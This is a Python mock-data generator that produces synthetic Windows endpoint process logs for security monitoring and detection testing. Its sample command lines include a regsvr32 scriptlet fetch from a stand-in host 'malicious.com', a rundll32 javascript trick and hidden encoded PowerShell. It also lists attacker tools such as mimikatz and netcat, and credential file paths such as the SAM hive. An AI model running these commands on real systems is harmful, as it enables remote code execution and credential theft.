"""
Process Logs Generator
Generates realistic endpoint process monitoring events for security analysis
"""

import random
from datetime import datetime, timedelta
from typing import Dict, List, Any

from ..utils import BaseMockGenerator, MockEvent, MockDataType, SeverityLevel


class ProcessLogsGenerator(BaseMockGenerator):
    """
    Generates realistic process execution logs for endpoint security monitoring
    """
    
    def __init__(self, seed: int = None):
        super().__init__(seed)
        
        # Process event types
        self.process_events = {
            "process_creation": {
                "description": "New process started",
                "severity": SeverityLevel.LOW,
                "action": "creation"
            },
            "process_termination": {
                "description": "Process terminated",
                "severity": SeverityLevel.LOW,
                "action": "termination"
            },
            "suspicious_process": {
                "description": "Suspicious process behavior detected",
                "severity": SeverityLevel.HIGH,
                "action": "suspicious_behavior"
            },
            "process_injection": {
                "description": "Process injection detected",
                "severity": SeverityLevel.CRITICAL,
                "action": "injection"
            },
            "dll_load": {
                "description": "Dynamic library loaded",
                "severity": SeverityLevel.LOW,
                "action": "dll_load"
            },
            "registry_access": {
                "description": "Registry access by process",
                "severity": SeverityLevel.MEDIUM,
                "action": "registry_access"
            },
            "network_connection": {
                "description": "Network connection by process",
                "severity": SeverityLevel.MEDIUM,
                "action": "network_connection"
            },
            "file_access": {
                "description": "File access by process",
                "severity": SeverityLevel.LOW,
                "action": "file_access"
            },
            "privilege_escalation": {
                "description": "Process privilege escalation",
                "severity": SeverityLevel.HIGH,
                "action": "privilege_escalation"
            },
            "code_injection": {
                "description": "Code injection into process",
                "severity": SeverityLevel.CRITICAL,
                "action": "code_injection"
            }
        }
        
        # Common Windows processes
        self.legitimate_processes = [
            {"name": "svchost.exe", "path": "C:\\Windows\\System32\\svchost.exe", "publisher": "Microsoft Corporation"},
            {"name": "explorer.exe", "path": "C:\\Windows\\explorer.exe", "publisher": "Microsoft Corporation"},
            {"name": "winlogon.exe", "path": "C:\\Windows\\System32\\winlogon.exe", "publisher": "Microsoft Corporation"},
            {"name": "csrss.exe", "path": "C:\\Windows\\System32\\csrss.exe", "publisher": "Microsoft Corporation"},
            {"name": "lsass.exe", "path": "C:\\Windows\\System32\\lsass.exe", "publisher": "Microsoft Corporation"},
            {"name": "chrome.exe", "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "publisher": "Google LLC"},
            {"name": "firefox.exe", "path": "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "publisher": "Mozilla Corporation"},
            {"name": "notepad.exe", "path": "C:\\Windows\\System32\\notepad.exe", "publisher": "Microsoft Corporation"},
            {"name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "publisher": "Microsoft Corporation"},
            {"name": "cmd.exe", "path": "C:\\Windows\\System32\\cmd.exe", "publisher": "Microsoft Corporation"}
        ]
        
        # Suspicious processes and malware
        self.suspicious_processes = [
            {"name": "mimikatz.exe", "path": "C:\\Temp\\mimikatz.exe", "publisher": "Unknown"},
            {"name": "psexec.exe", "path": "C:\\Tools\\psexec.exe", "publisher": "Microsoft Corporation"},
            {"name": "nc.exe", "path": "C:\\Temp\\nc.exe", "publisher": "Unknown"},
            {"name": "procdump.exe", "path": "C:\\Temp\\procdump.exe", "publisher": "Microsoft Corporation"},
            {"name": "rundll32.exe", "path": "C:\\Windows\\System32\\rundll32.exe", "publisher": "Microsoft Corporation"},
            {"name": "regsvr32.exe", "path": "C:\\Windows\\System32\\regsvr32.exe", "publisher": "Microsoft Corporation"},
            {"name": "mshta.exe", "path": "C:\\Windows\\System32\\mshta.exe", "publisher": "Microsoft Corporation"},
            {"name": "bitsadmin.exe", "path": "C:\\Windows\\System32\\bitsadmin.exe", "publisher": "Microsoft Corporation"},
            {"name": "certutil.exe", "path": "C:\\Windows\\System32\\certutil.exe", "publisher": "Microsoft Corporation"},
            {"name": "wmic.exe", "path": "C:\\Windows\\System32\\wbem\\wmic.exe", "publisher": "Microsoft Corporation"}
        ]
        
        # Common DLLs
        self.common_dlls = [
            {"name": "ntdll.dll", "path": "C:\\Windows\\System32\\ntdll.dll", "version": "10.0.19041.1023"},
            {"name": "kernel32.dll", "path": "C:\\Windows\\System32\\kernel32.dll", "version": "10.0.19041.906"},
            {"name": "advapi32.dll", "path": "C:\\Windows\\System32\\advapi32.dll", "version": "10.0.19041.844"},
            {"name": "user32.dll", "path": "C:\\Windows\\System32\\user32.dll", "version": "10.0.19041.906"},
            {"name": "wininet.dll", "path": "C:\\Windows\\System32\\wininet.dll", "version": "11.0.19041.1023"},
            {"name": "ws2_32.dll", "path": "C:\\Windows\\System32\\ws2_32.dll", "version": "10.0.19041.1"},
            {"name": "crypt32.dll", "path": "C:\\Windows\\System32\\crypt32.dll", "version": "10.0.19041.964"}
        ]
        
        # Registry keys commonly accessed
        self.registry_keys = [
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
            "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKLM\\SYSTEM\\CurrentControlSet\\Services",
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
            "HKLM\\SOFTWARE\\Classes",
            "HKLM\\SECURITY\\Policy\\Accounts",
            "HKLM\\SAM\\SAM\\Domains\\Account\\Users"
        ]
        
        # File paths for different categories
        self.file_categories = {
            "system": [
                "C:\\Windows\\System32\\config\\SAM",
                "C:\\Windows\\System32\\config\\SYSTEM", 
                "C:\\Windows\\System32\\config\\SECURITY",
                "C:\\Windows\\System32\\drivers\\etc\\hosts"
            ],
            "user": [
                "C:\\Users\\{}\\Documents\\passwords.txt",
                "C:\\Users\\{}\\Desktop\\credentials.xlsx",
                "C:\\Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default\\key4.db"
            ],
            "temp": [
                "C:\\Temp\\payload.exe",
                "C:\\Windows\\Temp\\update.bat",
                "C:\\Users\\{}\\AppData\\Local\\Temp\\malware.exe"
            ]
        }
    
    def generate_event(self) -> MockEvent:
        """Generate a single process log event"""
        
        # Select event type
        event_type = random.choice(list(self.process_events.keys()))
        event_info = self.process_events[event_type]
        
        # Determine if this should be suspicious
        is_suspicious = event_type in ["suspicious_process", "process_injection", "privilege_escalation", "code_injection"]
        
        # Select process based on suspiciousness
        if is_suspicious or random.random() < 0.1:  # 10% chance of suspicious process
            process_info = random.choice(self.suspicious_processes)
            severity = SeverityLevel.HIGH if not is_suspicious else event_info["severity"]
        else:
            process_info = random.choice(self.legitimate_processes)
            severity = event_info["severity"]
        
        # Generate timestamp
        timestamp = self._get_realistic_timestamp()
        
        # Base event structure
        event_data = {
            "@timestamp": timestamp.isoformat(),
            "event": {
                "category": ["process"],
                "type": ["start"] if event_type == "process_creation" else ["end"] if event_type == "process_termination" else ["info"],
                "action": event_info["action"],
                "outcome": "success" if random.random() > 0.05 else "failure",
                "severity": severity.value
            },
            "host": {
                "name": self._get_random_hostname(),
                "ip": [self._get_random_ip(private=True)],
                "os": {
                    "name": "Windows",
                    "family": "windows",
                    "version": random.choice(["10.0.19041", "10.0.19042", "10.0.22000", "10.0.22621"]),
                    "platform": "windows"
                },
                "architecture": "x86_64"
            },
            "process": {
                "pid": random.randint(1000, 32768),
                "name": process_info["name"],
                "executable": process_info["path"],
                "command_line": self._generate_command_line(process_info),
                "working_directory": self._get_working_directory(process_info["path"]),
                "start": timestamp.isoformat(),
                "thread": {
                    "id": random.randint(1000, 9999)
                },
                "pe": {
                    "company": process_info.get("publisher", "Unknown"),
                    "description": f"{process_info['name']} - System Process",
                    "file_version": f"{random.randint(6, 10)}.{random.randint(0, 9)}.{random.randint(1000, 9999)}.{random.randint(0, 999)}",
                    "original_file_name": process_info["name"]
                }
            },
            "user": {
                "name": self._get_random_username(),
                "domain": random.choice(["WORKGROUP", "CORP", "DOMAIN"]),
                "id": f"S-1-5-21-{random.randint(100000000, 999999999)}-{random.randint(100000000, 999999999)}-{random.randint(100000000, 999999999)}-{random.randint(1000, 9999)}"
            }
        }
        
        # Add parent process if applicable
        if event_type in ["process_creation", "suspicious_process", "process_injection"]:
            parent_process = random.choice(self.legitimate_processes)
            event_data["process"]["parent"] = {
                "pid": random.randint(100, 999),
                "name": parent_process["name"],
                "executable": parent_process["path"],
                "command_line": self._generate_command_line(parent_process)
            }
        
        # Add event-specific fields
        self._add_event_specific_fields(event_type, event_data, event_info, process_info)
        
        # Add dashboard fields
        event_data["severity"] = severity.value
        event_data["status"] = random.choice(["active", "resolved", "investigating"])
        
        # Classification based on severity
        if severity.value >= 4:  # CRITICAL
            event_data["alert_type"] = "critical_process_alert"
            event_data["threat_level"] = "critical_process_threat"
        elif severity.value >= 3:  # HIGH
            event_data["alert_type"] = "high_process_alert" 
            event_data["threat_level"] = "high_process_threat"
        elif severity.value >= 2:  # MEDIUM
            event_data["alert_type"] = "medium_process_warning"
            event_data["threat_level"] = "medium_process_threat"
        else:  # LOW
            event_data["alert_type"] = "process_informational"
            event_data["threat_level"] = "low_process_activity"
        
        return MockEvent(
            id=self._generate_id(),
            timestamp=timestamp,
            event_type=MockDataType.PROCESS_LOG,
            severity=severity,
            source="endpoint_detection",
            data=event_data
        )
    
    def _generate_command_line(self, process_info: Dict[str, str]) -> str:
        """Generate realistic command line arguments"""
        
        base_cmd = f'"{process_info["path"]}"'
        
        if process_info["name"] == "powershell.exe":
            args = random.choice([
                "-ExecutionPolicy Bypass -File script.ps1",
                "-WindowStyle Hidden -EncodedCommand aGVsbG8gd29ybGQ=",
                "-NoProfile -Command Get-Process",
                ""
            ])
        elif process_info["name"] == "cmd.exe":
            args = random.choice([
                "/c whoami",
                "/c dir C:\\",
                "/c net user",
                ""
            ])
        elif process_info["name"] == "rundll32.exe":
            args = random.choice([
                "shell32.dll,ShellExec_RunDLL",
                "advpack.dll,LaunchINFSection",
                "javascript:\"\\..\\mshtml,RunHTMLApplication\"",
                ""
            ])
        elif process_info["name"] == "regsvr32.exe":
            args = random.choice([
                "/s /n /u /i:http://malicious.com/payload scrobj.dll",
                "/u malicious.dll",
                ""
            ])
        else:
            args = ""
        
        return f"{base_cmd} {args}".strip()
    
    def _get_working_directory(self, executable_path: str) -> str:
        """Get working directory based on executable path"""
        import os
        return os.path.dirname(executable_path) if executable_path else "C:\\"
    
    def _add_event_specific_fields(self, event_type: str, event_data: Dict[str, Any], event_info: Dict[str, Any], process_info: Dict[str, str]):
        """Add specific fields based on event type"""
        
        if event_type == "dll_load":
            dll = random.choice(self.common_dlls)
            event_data["dll"] = {
                "name": dll["name"],
                "path": dll["path"],
                "pe": {
                    "file_version": dll["version"],
                    "company": "Microsoft Corporation"
                },
                "hash": {
                    "sha256": f"sha256:{random.randint(10**15, 10**16-1):x}"
                }
            }
            
        elif event_type == "registry_access":
            reg_key = random.choice(self.registry_keys)
            event_data["registry"] = {
                "key": reg_key,
                "value": random.choice(["", "WindowsUpdate", "MaliciousApp", "SystemBackdoor"]),
                "data": {
                    "type": random.choice(["REG_SZ", "REG_DWORD", "REG_BINARY"]),
                    "value": random.choice(["C:\\malware.exe", "1", "enabled"])
                },
                "operation": random.choice(["query", "set", "delete", "create"])
            }
            
        elif event_type == "network_connection":
            event_data["network"] = {
                "direction": random.choice(["outbound", "inbound"]),
                "protocol": random.choice(["tcp", "udp"]),
                "transport": "tcp"
            }
            event_data["source"] = {
                "ip": self._get_random_ip(private=True),
                "port": random.randint(49152, 65535)
            }
            event_data["destination"] = {
                "ip": self._get_random_ip(private=random.choice([True, False])),
                "port": random.choice([80, 443, 8080, 3389, 22, 21, 25, 53])
            }
            
        elif event_type == "file_access":
            category = random.choice(list(self.file_categories.keys()))
            file_path = random.choice(self.file_categories[category])
            
            if "{}" in file_path:
                username = self._get_random_username()
                file_path = file_path.format(username)
            
            event_data["file"] = {
                "path": file_path,
                "name": file_path.split("\\")[-1],
                "directory": "\\".join(file_path.split("\\")[:-1]),
                "extension": file_path.split(".")[-1] if "." in file_path else "",
                "size": random.randint(1024, 10485760),  # 1KB to 10MB
                "accessed": datetime.now().isoformat(),
                "created": (datetime.now() - timedelta(days=random.randint(1, 365))).isoformat(),
                "mtime": datetime.now().isoformat(),
                "type": "file"
            }
            event_data["event"]["action"] = random.choice(["read", "write", "delete", "execute"])
            
        elif event_type in ["process_injection", "code_injection"]:
            target_process = random.choice(self.legitimate_processes)
            event_data["target"] = {
                "process": {
                    "pid": random.randint(1000, 32768),
                    "name": target_process["name"],
                    "executable": target_process["path"]
                }
            }
            event_data["injection"] = {
                "technique": random.choice([
                    "DLL Injection", "Process Hollowing", "Reflective DLL Loading",
                    "Manual DLL Loading", "Thread Execution Hijacking"
                ]),
                "success": random.choice([True, False]),
                "injected_size": random.randint(1024, 1048576)  # 1KB to 1MB
            }
            
        elif event_type == "privilege_escalation":
            event_data["privilege_escalation"] = {
                "from_privilege": random.choice(["User", "PowerUser", "Guest"]),
                "to_privilege": random.choice(["Administrator", "SYSTEM", "LocalSystem"]),
                "method": random.choice([
                    "Token Impersonation", "UAC Bypass", "Service Exploitation",
                    "Scheduled Task", "DLL Hijacking"
                ]),
                "success": random.choice([True, False])
            }
            
        # Add hash information for executable
        event_data["process"]["hash"] = {
            "md5": f"md5:{random.randint(10**15, 10**16-1):x}",
            "sha1": f"sha1:{random.randint(10**19, 10**20-1):x}",
            "sha256": f"sha256:{random.randint(10**30, 10**31-1):x}"
        }
    
    def generate_batch(self, count: int = 10) -> List[MockEvent]:
        """Generate a batch of process log events"""
        return [self.generate_event() for _ in range(count)]
